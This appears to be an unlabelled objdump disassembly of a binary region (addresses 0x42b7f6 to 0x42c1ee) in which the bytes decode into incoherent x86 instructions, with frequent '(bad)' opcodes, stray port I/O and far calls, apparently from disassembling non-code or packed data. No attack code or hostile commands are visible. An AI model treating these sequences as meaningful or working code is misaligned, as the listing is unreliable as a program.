  42b7f6:	and    dl,BYTE PTR [ecx-0x79]
  42b7f9:	stos   BYTE PTR es:[edi],al
  42b7fa:	mov    al,ds:0xf2751099
  42b7ff:	dec    esi
  42b800:	in     al,dx
  42b801:	mov    ebx,DWORD PTR [ebp+0x37]
  42b804:	add    eax,0xd413e770
  42b809:	sub    cl,BYTE PTR [eax+0x56cb6f55]
  42b80f:	mov    eax,ds:0xfff8dfd5
  42b814:	mov    cs,WORD PTR [ebp+eax*4+0x2782765b]
  42b81b:	xchg   DWORD PTR [esi],ecx
  42b81d:	jle    0x42b7ce
  42b81f:	and    ebx,edi
  42b821:	cwde   
  42b822:	(bad)  
  42b823:	std    
  42b824:	(bad)  
  42b825:	retf   
  42b826:	pop    ds
  42b827:	mov    ch,0xa5
  42b829:	pop    eax
  42b82a:	xlat   BYTE PTR ds:[ebx]
  42b82b:	ror    BYTE PTR [esi],0xce
  42b82e:	dec    esp
  42b82f:	jnp    0x42b801
  42b831:	adc    al,0x29
  42b833:	sar    BYTE PTR [esi+0x0],0x0
	...
  42b893:	add    BYTE PTR [eax],al
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi+0x628cc1f0]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [esi],ch
  42b8af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8b0:	dec    esp
  42b8b1:	mov    eax,ds:0x6d0a79b2
  42b8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b8b7:	or     DWORD PTR [ebx],edi
  42b8b9:	push   esi
  42b8ba:	adc    al,0x73
  42b8bc:	jl     0x42b866
  42b8be:	sbb    al,0x4a
  42b8c0:	sbb    edi,ebp
  42b8c2:	mov    al,0x6c
  42b8c4:	jl     0x42b89f
  42b8c6:	mov    edx,0x34491318
  42b8cb:	push   esp
  42b8cc:	icebp  
  42b8cd:	xchg   ecx,eax
  42b8ce:	mov    ah,0x3
  42b8d0:	and    dl,0xb8
  42b8d3:	repnz es inc ecx
  42b8d6:	xchg   edi,eax
  42b8d7:	rcr    BYTE PTR [esi-0x6db39225],1
  42b8dd:	mov    ch,0x77
  42b8df:	dec    ecx
  42b8e0:	jbe    0x42b8d5
  42b8e2:	inc    edi
  42b8e3:	shl    dl,1
  42b8e5:	inc    ecx
  42b8e6:	cld    
  42b8e7:	ja     0x42b875
  42b8e9:	dec    esi
  42b8ea:	xor    eax,0xed25ce2d
  42b8ef:	pusha  
  42b8f0:	ret    
  42b8f1:	pusha  
  42b8f2:	and    al,0x54
  42b8f4:	addr16 call 0xb9ab:0x95562e1c
  42b8fc:	sub    al,0x3b
  42b8fe:	div    BYTE PTR [esi]
  42b900:	cmc    
  42b901:	mov    cl,0x62
  42b903:	mov    esp,0xb4e70fe4
  42b908:	stos   DWORD PTR es:[edi],eax
  42b909:	mov    DWORD PTR [ebp-0x44bb486],0x9a043ebf
  42b913:	rcl    ecx,0xde
  42b916:	iret   
  42b917:	adc    DWORD PTR [ebp+0x42],esp
  42b91a:	mov    edi,0xbbe59e68
  42b91f:	inc    edx
  42b920:	jl     0x42b8e7
  42b922:	stc    
  42b923:	out    0x38,eax
  42b925:	pop    ds
  42b926:	fbld   TBYTE PTR [eax-0x6d]
  42b929:	push   0x338f076c
  42b92e:	dec    esp
  42b92f:	in     al,dx
  42b930:	xlat   BYTE PTR ds:[ebx]
  42b931:	push   DWORD PTR [ecx]
  42b933:	rcl    cl,1
  42b935:	push   edx
  42b936:	enter  0xe3d6,0xdf
  42b93a:	add    eax,0x6104179e
  42b93f:	sti    
  42b940:	test   eax,0xf009054f
  42b945:	mov    esi,0xb834732c
  42b94a:	sub    esp,edi
  42b94c:	stos   BYTE PTR es:[edi],al
  42b94d:	add    eax,0x11f88a23
  42b952:	es push ds
  42b954:	jg     0x42b9c0
  42b956:	movd   DWORD PTR [esp+eiz*4],mm0
  42b95a:	shl    BYTE PTR [ecx-0x3],0xde
  42b95e:	int3   
  42b95f:	xor    BYTE PTR [eax-0x18],dh
  42b962:	rol    bl,0x14
  42b965:	or     DWORD PTR [edx+esi*2],edi
  42b968:	(bad)  
  42b969:	pop    eax
  42b96a:	and    eax,DWORD PTR [ebx+ebp*4]
  42b96d:	jo     0x42b940
  42b96f:	std    
  42b970:	fmul   DWORD PTR [eax+0x73]
  42b973:	mov    dl,0x1f
  42b975:	cdq    
  42b976:	lods   eax,DWORD PTR ds:[esi]
  42b977:	mov    esp,cr5
  42b97a:	scas   eax,DWORD PTR es:[edi]
  42b97b:	xor    dl,bh
  42b97d:	inc    ecx
  42b97e:	aas    
  42b97f:	dec    ecx
  42b980:	ror    ebp,1
  42b982:	js     0x42b9fb
  42b984:	test   al,0xb2
  42b986:	popa   
  42b987:	ret    0x6238
  42b98a:	mov    bh,0x4f
  42b98c:	cwde   
  42b98d:	shl    BYTE PTR [edx+0x7c],cl
  42b990:	cmc    
  42b991:	int3   
  42b992:	dec    ecx
  42b993:	or     al,0x39
  42b995:	inc    eax
  42b996:	call   0x48faab24
  42b99b:	aas    
  42b99c:	and    bh,BYTE PTR [ebp+0x6ca0f97c]
  42b9a2:	mov    ebx,0x4163258e
  42b9a7:	dec    edi
  42b9a8:	mov    dl,0xad
  42b9aa:	out    0x7d,al
  42b9ac:	aas    
  42b9ad:	cmp    DWORD PTR [eax],edx
  42b9af:	and    eax,0xb479a27
  42b9b4:	scas   al,BYTE PTR es:[edi]
	...
  42ba15:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba1b:	neg    ebx
  42ba1d:	outs   dx,DWORD PTR ds:[esi]
  42ba1e:	xor    DWORD PTR [eax-0x80],eax
  42ba21:	(bad)  
  42ba23:	dec    ecx
  42ba24:	ret    
  42ba25:	rcr    eax,cl
  42ba27:	rol    BYTE PTR [ecx],cl
  42ba29:	add    BYTE PTR [edi],al
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [esi-0x34],dh
  42ba30:	or     ch,dl
  42ba32:	dec    ecx
  42ba33:	or     ebx,DWORD PTR [eax]
  42ba35:	cmp    ebx,edi
  42ba37:	mov    al,ds:0xab41f2ad
  42ba3c:	sbb    al,BYTE PTR [ebp+ebx*2+0x3]
  42ba40:	dec    ebx
  42ba41:	jnp    0x42ba7a
  42ba43:	retf   
  42ba44:	and    BYTE PTR [esi],ch
  42ba46:	push   ds
  42ba47:	inc    ebp
  42ba48:	inc    edi
  42ba49:	sub    ah,BYTE PTR [esi+0x8c172eb]
  42ba4f:	xor    DWORD PTR ds:0xa8e11cf7,esp
  42ba55:	loop   0x42baa7
  42ba57:	push   edx
  42ba58:	jb     0x42babe
  42ba5a:	sar    ebp,1
  42ba5c:	add    cl,BYTE PTR [esi]
  42ba5e:	scas   al,BYTE PTR es:[edi]
  42ba5f:	mov    WORD PTR [ebp-0xe62e3e4],cs
  42ba65:	xchg   esi,eax
  42ba66:	das    
  42ba67:	dec    edi
  42ba68:	adc    cl,ch
  42ba6a:	outs   dx,BYTE PTR ds:[esi]
  42ba6b:	jle    0x42ba72
  42ba6d:	test   al,0x65
  42ba6f:	(bad)  
  42ba70:	in     al,0x22
  42ba72:	lock bsf eax,DWORD PTR [ebx+ebx*8+0x27]
  42ba78:	mov    esp,0xda6fb574
  42ba7d:	imul   BYTE PTR [edi-0x1ad3b533]
  42ba83:	enter  0x9f96,0xea
  42ba87:	ret    
  42ba88:	pop    ss
  42ba89:	mov    eax,0xb4600626
  42ba8e:	push   ebx
  42ba8f:	jns    0x42baba
  42ba91:	xchg   esi,eax
  42ba92:	pushf  
  42ba93:	cmp    al,0xfa
  42ba95:	jp     0x42ba68
  42ba97:	mov    ss:0x7e668c47,al
  42ba9d:	sbb    eax,ebp
  42ba9f:	test   DWORD PTR [ebx+0x7a],0x34f0e93d
  42baa6:	adc    DWORD PTR [esp+eiz*2+0x7e],esi
  42baaa:	cld    
  42baab:	retf   0x9f60
  42baae:	jge    0x42bb06
  42bab0:	call   0xd0d0:0xc59fead7
  42bab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bab8:	cmc    
  42bab9:	adc    dl,BYTE PTR [esi-0x29ed15e5]
  42babf:	xchg   ecx,eax
  42bac0:	mov    dh,0xee
  42bac2:	iret   
  42bac3:	adc    DWORD PTR [ebp+ebp*8+0x457ac674],0x74
  42bacb:	xchg   ecx,eax
  42bacc:	xchg   ebp,eax
  42bacd:	test   DWORD PTR [edi+0x62],esi
  42bad0:	mov    esi,0xeadfa258
  42bad5:	adc    edx,DWORD PTR [ecx]
  42bad7:	nop
  42bad8:	add    eax,0xe463c18
  42badd:	push   eax
  42bade:	push   edx
  42badf:	fcmovnbe st,st(5)
  42bae1:	pop    edx
  42bae2:	out    dx,eax
  42bae3:	fnop   
  42bae5:	in     al,dx
  42bae6:	sbb    eax,0x1704fe10
  42baeb:	sbb    DWORD PTR [edi-0x6b],ebx
  42baee:	call   0x46bc:0x26faa51a
  42baf5:	test   eax,0x4fe8e6bf
  42bafa:	fadd   QWORD PTR [ebp+0x26]
  42bafd:	sub    eax,0x74d04adc
  42bb02:	in     eax,dx
  42bb03:	lea    edx,[ecx-0x2e]
  42bb06:	xchg   esi,eax
  42bb07:	push   ebx
  42bb08:	cmp    ecx,eax
  42bb0a:	inc    edx
  42bb0b:	mov    ds:0x11186eb,eax
  42bb10:	iret   
  42bb11:	pop    es
  42bb12:	lock sbb bl,BYTE PTR [esp+ecx*4]
  42bb16:	inc    esp
  42bb17:	repnz pop es
  42bb19:	mov    ds:0x9122d72c,al
  42bb1e:	push   ecx
  42bb1f:	jg     0x42bb3f
  42bb21:	sub    eax,0x78a5686e
  42bb26:	dec    ebp
  42bb27:	loope  0x42bb83
  42bb29:	call   0x10714515
  42bb2e:	dec    ebx
  42bb2f:	dec    ebx
  42bb30:	pop    ebp
  42bb31:	cs adc eax,0x2bda
	...
  42bb93:	add    BYTE PTR [eax],al
  42bb95:	add    BYTE PTR [eax+ebp*1],dh
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    esi,DWORD PTR [ebx-0x202b5370]
  42bba7:	rol    DWORD PTR [ecx],cl
  42bba9:	add    BYTE PTR [edi],al
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [eax+0x7553e9d5],cl
  42bbb3:	repnz and eax,0x61fcb4f5
  42bbb9:	pop    edi
  42bbba:	xlat   BYTE PTR ds:[ebx]
  42bbbb:	mov    eax,DWORD PTR [edx-0xb]
  42bbbe:	call   0x663b:0x71555709
  42bbc5:	mul    esp
  42bbc7:	enter  0xe6b,0x24
  42bbcb:	pop    ebp
  42bbcc:	sbb    DWORD PTR [ebx],ebp
  42bbce:	dec    esp
  42bbcf:	cmc    
  42bbd0:	imul   esi,DWORD PTR [edi],0x57c2f43d
  42bbd6:	mov    dl,bh
  42bbd8:	clc    
  42bbd9:	out    dx,eax
  42bbda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbdb:	pushf  
  42bbdc:	sbb    ah,bl
  42bbde:	mov    dl,0x70
  42bbe0:	mov    bh,0x1d
  42bbe2:	or     BYTE PTR [edi-0x6dcdef4a],cl
  42bbe8:	aaa    
  42bbe9:	pop    es
  42bbea:	sbb    esp,DWORD PTR [edx+0x2f]
  42bbed:	(bad)  
  42bbee:	push   edi
  42bbef:	jb     0x42bc35
  42bbf1:	inc    esi
  42bbf2:	addr16 or eax,0xcd0fad9
  42bbf8:	dec    esp
  42bbf9:	pusha  
  42bbfa:	or     ebp,esi
  42bbfc:	mov    DWORD PTR [ebp+0xc],eax
  42bbff:	pop    edx
  42bc00:	push   ebp
  42bc01:	pop    edi
  42bc02:	pop    ss
  42bc03:	out    dx,eax
  42bc04:	fs (bad) 
  42bc08:	repz js 0x42bbac
  42bc0b:	xor    edx,DWORD PTR [esp+ecx*2-0xb]
  42bc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc10:	xor    esi,edi
  42bc12:	mov    al,0xc
  42bc14:	jb     0x42bba3
  42bc16:	inc    eax
  42bc17:	cli    
  42bc18:	lahf   
  42bc19:	into   
  42bc1a:	dec    edi
  42bc1b:	rol    BYTE PTR [edx+0x285a52db],0xfd
  42bc22:	jp     0x10de986b
  42bc28:	mov    ss,WORD PTR [esi]
  42bc2a:	outs   dx,DWORD PTR ds:[esi]
  42bc2b:	aad    0x48
  42bc2d:	or     BYTE PTR [ecx-0x20],bh
  42bc30:	out    dx,al
  42bc31:	pop    es
  42bc32:	hlt    
  42bc33:	scas   al,BYTE PTR es:[edi]
  42bc34:	enter  0x283e,0xc9
  42bc38:	data16 jg 0x42bc65
  42bc3b:	inc    ebp
  42bc3c:	add    ebx,DWORD PTR [ecx-0x75b75b54]
  42bc42:	test   al,0xa
  42bc44:	dec    ebx
  42bc45:	popa   
  42bc46:	pusha  
  42bc47:	into   
  42bc48:	push   ds
  42bc49:	mov    cl,0xfb
  42bc4b:	inc    ebx
  42bc4c:	scas   eax,DWORD PTR es:[edi]
  42bc4d:	add    BYTE PTR [edx+0x68d50dec],al
  42bc53:	mov    edx,0x3cabed86
  42bc58:	jne    0x42bc4a
  42bc5a:	int    0xdb
  42bc5c:	xor    al,0x6c
  42bc5e:	mov    eax,ds:0x5d40cb7a
  42bc63:	dec    DWORD PTR [edi-0x2e3d6bb9]
  42bc69:	mov    dl,0xef
  42bc6b:	mov    ecx,0xc3a02a2b
  42bc70:	add    BYTE PTR [edx+0x43],cl
  42bc73:	test   BYTE PTR [ebx+0x13b75890],al
  42bc79:	pop    eax
  42bc7a:	repnz enter 0x16ce,0x4a
  42bc7f:	xor    esi,DWORD PTR fs:[esi+0x9]
  42bc83:	mov    ebx,0x27ea2954
  42bc88:	dec    esp
  42bc89:	adc    cl,BYTE PTR [ecx-0x47]
  42bc8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc8d:	push   es
  42bc8e:	mov    ah,0x58
  42bc90:	ror    DWORD PTR [ecx+ebp*8],0x60
  42bc94:	mov    bh,0x7a
  42bc96:	cmp    al,0xdf
  42bc98:	or     dh,BYTE PTR [ecx-0x53d43c7c]
  42bc9e:	jle    0x42bc8d
  42bca0:	xor    esp,DWORD PTR [ecx]
  42bca2:	in     eax,dx
  42bca3:	cmp    esi,DWORD PTR [edi]
  42bca5:	pop    esp
  42bca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bca7:	and    eax,0xc81f4bcc
  42bcac:	icebp  
  42bcad:	pop    ss
  42bcae:	adc    DWORD PTR [edi+edx*1],ebx
  42bcb1:	repnz nop
  42bcb3:	mov    eax,ds:0x7d
	...
  42bd14:	add    BYTE PTR [eax],al
  42bd16:	mov    al,0xb6
  42bd18:	pushf  
  42bd19:	adc    al,0x9e
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	aad    0x6d
  42bd24:	rcr    BYTE PTR [ebx],0xe6
  42bd27:	aam    0x1
  42bd29:	add    BYTE PTR [edi],al
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    BYTE PTR [esi-0x32],ch
  42bd30:	ds ja  0x42bd01
  42bd33:	push   edx
  42bd34:	mov    eax,0xf74b3d45
  42bd39:	add    DWORD PTR [edi],ebx
  42bd3b:	mov    sp,0x5db
  42bd3f:	mov    esp,0x7a8c2f52
  42bd44:	daa    
  42bd45:	retf   0xcc01
  42bd48:	dec    edi
  42bd49:	push   ds
  42bd4a:	loope  0x42bd6f
  42bd4c:	pusha  
  42bd4d:	test   DWORD PTR [edx+0x76d35f12],edx
  42bd53:	mov    dl,0x3c
  42bd55:	aaa    
  42bd56:	jp     0x42bdb1
  42bd58:	js     0x42bd3c
  42bd5a:	mov    DWORD PTR [edi-0x5f],edx
  42bd5d:	nop
  42bd5e:	out    dx,al
  42bd5f:	sub    BYTE PTR [ebp-0x213f5936],ah
  42bd65:	leave  
  42bd66:	or     bh,BYTE PTR [ebp-0xf]
  42bd69:	sbb    DWORD PTR [edx-0x20],0xa15fcd9b
  42bd70:	test   BYTE PTR [ebp-0xd],bh
  42bd73:	enter  0x1f5e,0x60
  42bd77:	mov    al,0x66
  42bd79:	loop   0x42bd24
  42bd7b:	mov    WORD PTR [esi],gs
  42bd7d:	and    DWORD PTR [eiz*2-0x494f6fd5],ebx
  42bd84:	inc    bx
  42bd86:	in     eax,dx
  42bd87:	jb     0x42bdaf
  42bd89:	daa    
  42bd8a:	push   esp
  42bd8b:	pop    edx
  42bd8c:	sbb    BYTE PTR [edx-0x13c5772c],cl
  42bd92:	jbe    0x42bde7
  42bd94:	mov    dl,0x6b
  42bd96:	jbe    0x42be06
  42bd98:	std    
  42bd99:	inc    edx
  42bd9a:	dec    esi
  42bd9b:	jp     0x42bd5c
  42bd9d:	mov    eax,DWORD PTR [eax+0x7e25cbd7]
  42bda3:	jbe    0x42bd47
  42bda5:	sar    edi,cl
  42bda7:	pop    eax
  42bda8:	jp     0x42be23
  42bdaa:	sar    DWORD PTR [edx+0x40bdc020],0x1d
  42bdb1:	rol    edx,1
  42bdb3:	inc    ebx
  42bdb4:	or     cl,cl
  42bdb6:	xor    BYTE PTR [ebx+eiz*1-0x39],bl
  42bdba:	(bad)  
  42bdbb:	dec    edx
  42bdbc:	in     al,dx
  42bdbd:	fcmovnb st,st(6)
  42bdbf:	cld    
  42bdc0:	popa   
  42bdc1:	mov    fs,WORD PTR [eax-0x2d1093f4]
  42bdc7:	adc    eax,eax
  42bdc9:	js     0x42bd64
  42bdcb:	pop    ds
  42bdcc:	shl    DWORD PTR [edx],cl
  42bdce:	ror    DWORD PTR [ecx+0x3b],1
  42bdd1:	call   0xae01:0xbad3bc88
  42bdd8:	das    
  42bdd9:	and    eax,0x2ce08de7
  42bdde:	repz adc DWORD PTR [eax-0x71e437ea],ecx
  42bde5:	mov    ebp,0xd9887791
  42bdea:	push   ss
  42bdeb:	arpl   bx,si
  42bded:	sbb    al,0x27
  42bdef:	add    DWORD PTR [eax+0x2d],ecx
  42bdf2:	push   edi
  42bdf3:	sbb    dh,BYTE PTR [esp+ebx*1-0x2f]
  42bdf7:	xor    eax,0xf788984a
  42bdfc:	dec    esp
  42bdfd:	int    0x86
  42bdff:	ret    
  42be00:	in     al,dx
  42be01:	or     esi,esi
  42be03:	cwde   
  42be04:	imul   ecx,DWORD PTR [ebx-0x1fb19d66],0x30751367
  42be0e:	aad    0x83
  42be10:	jmp    0x42bdff
  42be12:	xlat   BYTE PTR ds:[ebx]
  42be13:	mov    ds:0x4a0034f2,eax
  42be18:	xor    BYTE PTR [esi-0x72339227],ch
  42be1e:	jp     0x42bde7
  42be20:	jbe    0x42be4b
  42be22:	das    
  42be23:	cdq    
  42be24:	mov    esp,0x33d88317
  42be29:	jp     0x42bea5
  42be2b:	and    eax,0x9f3a15d5
  42be30:	mov    ds:0x70cab571,al
	...
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	fucom  st(3)
  42bea3:	pop    esp
  42bea4:	js     0x42bf1b
  42bea6:	in     eax,dx
  42bea7:	aad    0x1
  42bea9:	add    BYTE PTR [edi],al
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    BYTE PTR [eax+0x1f6823cc],ah
  42beb3:	es into 
  42beb5:	cmp    esi,DWORD PTR [edi-0x5862cfe3]
  42bebb:	in     al,0x54
  42bebd:	xor    esp,DWORD PTR [ebp+0x78f40e37]
  42bec3:	fld    TBYTE PTR [ebp+0x66]
  42bec6:	rol    DWORD PTR [eax+eiz*2+0x1f],1
  42beca:	xor    DWORD PTR [ebp-0x40],esi
  42becd:	mov    dl,0xd6
  42becf:	iret   
  42bed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bed1:	sub    eax,0xf940e646
  42bed6:	div    BYTE PTR [ecx+0x3c4989e1]
  42bedc:	xor    eax,0xdbd28e88
  42bee1:	add    BYTE PTR [ecx-0x23],ah
  42bee4:	dec    edx
  42bee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bee6:	(bad)  
  42bee7:	jmp    0xac78:0x5a9321ac
  42beee:	outs   dx,BYTE PTR ds:[esi]
  42beef:	sub    ah,BYTE PTR [esi]
  42bef1:	pop    ss
  42bef2:	push   eax
  42bef3:	adc    dh,BYTE PTR [edx-0x1]
  42bef6:	ret    
  42bef7:	(bad)  
  42bef8:	pop    edi
  42bef9:	jne    0x42bed8
  42befb:	xor    DWORD PTR [edi+0x2c327cb0],esp
  42bf01:	sub    al,BYTE PTR [edi]
  42bf03:	cdq    
  42bf04:	stos   BYTE PTR es:[edi],al
  42bf05:	jle    0x42bf6f
  42bf07:	jmp    0x62855cd
  42bf0c:	cmp    al,0xa6
  42bf0e:	dec    ebp
  42bf0f:	test   al,0x1b
  42bf11:	shl    DWORD PTR [esp+ecx*2-0x62dbe36d],0x6f
  42bf19:	test   eax,0xc1937ab7
  42bf1e:	cmp    bh,dl
  42bf20:	pop    esi
  42bf21:	das    
  42bf22:	inc    ecx
  42bf23:	repnz add al,0x6a
  42bf26:	mov    eax,ds:0xbc1947d6
  42bf2b:	cmp    bl,BYTE PTR ds:0x9a2a7920
  42bf31:	jecxz  0x42bf51
  42bf33:	push   ds
  42bf34:	cs imul ebp,esp,0xc8683e7e
  42bf3b:	scas   eax,DWORD PTR es:[edi]
  42bf3c:	and    ecx,edi
  42bf3e:	xchg   ebx,eax
  42bf3f:	mov    edx,0xcff2e8b8
  42bf44:	xchg   BYTE PTR [edx-0x44d3affe],dl
  42bf4a:	js     0x42befb
  42bf4c:	xchg   esp,eax
  42bf4d:	adc    DWORD PTR [ecx],0x23
  42bf50:	add    BYTE PTR [ebx-0x26],ch
  42bf53:	sub    al,0xb7
  42bf55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf56:	and    DWORD PTR [edi+0x3a],ecx
  42bf59:	int3   
  42bf5a:	fsub   DWORD PTR [ecx+0x16190e43]
  42bf60:	push   ebx
  42bf61:	dec    eax
  42bf62:	or     BYTE PTR [ecx-0x361be3cf],bl
  42bf68:	mov    dh,BYTE PTR [ebx+0xa]
  42bf6b:	jge    0x42bfcb
  42bf6d:	mov    edx,0x34ff873a
  42bf72:	repnz retf 
  42bf74:	int3   
  42bf75:	sbb    al,0xec
  42bf77:	lds    esi,FWORD PTR [ecx]
  42bf79:	iret   
  42bf7a:	push   es
  42bf7b:	jae    0x42bf02
  42bf7d:	dec    ebx
  42bf7e:	pop    ds
  42bf7f:	aad    0xf
  42bf81:	jae    0x42bf39
  42bf83:	outs   dx,DWORD PTR ds:[esi]
  42bf84:	arpl   WORD PTR [edi+0x22],cx
  42bf87:	js     0x42bf57
  42bf89:	and    eax,DWORD PTR [edx+eiz*2-0xd0df2bd]
  42bf90:	pop    esi
  42bf91:	cmp    DWORD PTR [ecx],ebp
  42bf93:	js     0x42c007
  42bf95:	jae    0x42bf26
  42bf97:	cli    
  42bf98:	mov    ?,WORD PTR [edx+0x6c7877b2]
  42bf9e:	jne    0x42bf33
  42bfa0:	fwait
  42bfa1:	add    DWORD PTR [ecx-0x5d68358d],0xffffff80
  42bfa8:	sbb    dh,bl
  42bfaa:	pop    ecx
  42bfab:	test   eax,0x5f312b31
  42bfb0:	lds    eax,FWORD PTR [edi+0xd61a85]
	...
  42c016:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0xb298f806
  42c024:	sub    ecx,esi
  42c026:	hlt    
  42c027:	(bad)  
  42c028:	add    DWORD PTR [eax],eax
  42c02a:	pop    es
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [edx],dl
  42c02f:	ins    BYTE PTR es:[edi],dx
  42c030:	sti    
  42c031:	popf   
  42c032:	xchg   ecx,eax
  42c033:	pop    ecx
  42c034:	dec    esp
  42c035:	push   ecx
  42c036:	mov    bl,0x4a
  42c038:	inc    ebx
  42c039:	or     esi,DWORD PTR [esi]
  42c03b:	fld    DWORD PTR [ebp+0x7d]
  42c03e:	sbb    al,0x7e
  42c040:	in     al,0x2c
  42c042:	retf   0xd384
  42c045:	ret    
  42c046:	pop    ds
  42c047:	fwait
  42c048:	rcr    DWORD PTR [edi-0x2a713d48],cl
  42c04e:	jb     0x42bfe3
  42c050:	xchg   esp,eax
  42c051:	stos   BYTE PTR es:[edi],al
  42c052:	xchg   esi,eax
  42c053:	push   cs
  42c054:	jle    0x42c026
  42c056:	xchg   edx,eax
  42c057:	xchg   esp,eax
  42c058:	fild   QWORD PTR [ebp+eiz*8-0x2a]
  42c05c:	cwde   
  42c05d:	jl     0x42c057
  42c05f:	idiv   al
  42c061:	xchg   ecx,eax
  42c062:	fstp   QWORD PTR ds:0x136e190a
  42c068:	fistp  QWORD PTR [ebx-0x4e11a484]
  42c06e:	pop    esi
  42c06f:	and    ebp,DWORD PTR [esi+0x78]
  42c072:	dec    edx
  42c073:	xchg   esi,eax
  42c074:	sbb    eax,0x9a8b5609
  42c079:	mov    ebp,0x586423e7
  42c07e:	cld    
  42c07f:	retf   0x8bb2
  42c082:	sbb    al,al
  42c084:	mov    bh,0x54
  42c086:	js     0x42c03a
  42c088:	jae    0x42c0ed
  42c08a:	in     eax,dx
  42c08b:	jnp    0x42c0fe
  42c08d:	and    BYTE PTR [ebp-0x19e61c0e],bh
  42c093:	rcl    DWORD PTR [esp+ebx*8+0x45741924],1
  42c09a:	xor    al,0x17
  42c09c:	xchg   esp,eax
  42c09d:	cmp    al,0x34
  42c09f:	sbb    BYTE PTR [esi+eax*1],al
  42c0a2:	add    eax,0x2c2f4d10
  42c0a7:	test   edi,0x5a306890
  42c0ad:	xor    al,0x54
  42c0af:	dec    ecx
  42c0b0:	sahf   
  42c0b1:	daa    
  42c0b2:	sti    
  42c0b3:	sbb    al,0xe5
  42c0b5:	mov    eax,ds:0x149f296c
  42c0ba:	add    eax,0x30adb643
  42c0bf:	sbb    eax,0x2daefa25
  42c0c4:	cld    
  42c0c5:	aaa    
  42c0c6:	sub    dh,cl
  42c0c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c0c9:	pop    ebp
  42c0ca:	lock mov ecx,0xeca03f9e
  42c0d0:	ja     0x42c135
  42c0d2:	sbb    edi,DWORD PTR [ebx-0x6]
  42c0d5:	push   ebx
  42c0d6:	and    DWORD PTR [eax-0x63],esi
  42c0d9:	mov    dl,0x7f
  42c0db:	add    DWORD PTR [edx+0x7d],ecx
  42c0de:	in     eax,dx
  42c0df:	int    0x66
  42c0e1:	addr16 cdq 
  42c0e3:	add    dl,dl
  42c0e5:	scas   eax,DWORD PTR es:[edi]
  42c0e6:	ins    DWORD PTR es:[edi],dx
  42c0e7:	jns    0x42c13c
  42c0e9:	or     edi,esi
  42c0eb:	mov    ebx,0x2f327fa9
  42c0f0:	push   ss
  42c0f1:	pushf  
  42c0f2:	sbb    DWORD PTR [edi-0x2dafe226],eax
  42c0f8:	bound  edi,QWORD PTR [esi]
  42c0fa:	cmp    cl,BYTE PTR ds:0x276fe7bc
  42c100:	or     BYTE PTR [edx-0x8],al
  42c103:	int    0x10
  42c105:	imul   esp,DWORD PTR ds:0xe855797e,0xc6e2385e
  42c10f:	cmp    esi,DWORD PTR [ebp+0x2d75b18f]
  42c115:	scas   eax,DWORD PTR es:[edi]
  42c116:	add    BYTE PTR [ecx],bl
  42c118:	xor    ah,BYTE PTR [edx]
  42c11a:	fld    DWORD PTR [ebx+0xf]
  42c11d:	dec    ecx
  42c11e:	pop    edi
  42c11f:	mov    cl,0xc1
  42c121:	retf   0x2e1e
  42c124:	push   eax
  42c125:	sbb    BYTE PTR [ebp-0x6540c292],dh
  42c12b:	mov    bh,0xf7
  42c12d:	mov    ebx,0xe58cb693
  42c132:	addr16 dec ebp
  42c134:	mov    cl,0x0
	...
  42c196:	imul   eax,DWORD PTR [edx-0x10105133],0x3fa4c76b
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	repz inc esp
  42c1a4:	sbb    ah,BYTE PTR [ebx+edi*8-0x29]
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [eax+0x44],cl
  42c1b0:	xchg   DWORD PTR [ebx+0x72],esi
  42c1b3:	xchg   ebp,eax
  42c1b4:	sub    DWORD PTR [ebp-0x3dfd1697],0xffffff85
  42c1bb:	mov    al,0x65
  42c1bd:	adc    bh,ah
  42c1bf:	pushf  
  42c1c0:	retf   0xb1ac
  42c1c3:	adc    esp,DWORD PTR [edi+ecx*4+0x40f4a1a4]
  42c1ca:	xchg   edx,eax
  42c1cb:	out    dx,eax
  42c1cc:	lods   eax,DWORD PTR ds:[esi]
  42c1cd:	scas   eax,DWORD PTR es:[edi]
  42c1ce:	xlat   BYTE PTR ds:[ebx]
  42c1cf:	mov    al,ds:0xd30a5051
  42c1d4:	mov    eax,ds:0x9d157671
  42c1d9:	dec    ebx
  42c1da:	inc    ebx
  42c1db:	pop    edx
  42c1dc:	or     DWORD PTR ds:0xb6f1336a,ebx
  42c1e2:	inc    ecx
  42c1e3:	imul   BYTE PTR [esi+0x43]
  42c1e6:	jle    0x42c23c
  42c1e8:	or     ebp,0x81d06914
  42c1ee:	cmp    dh,ch
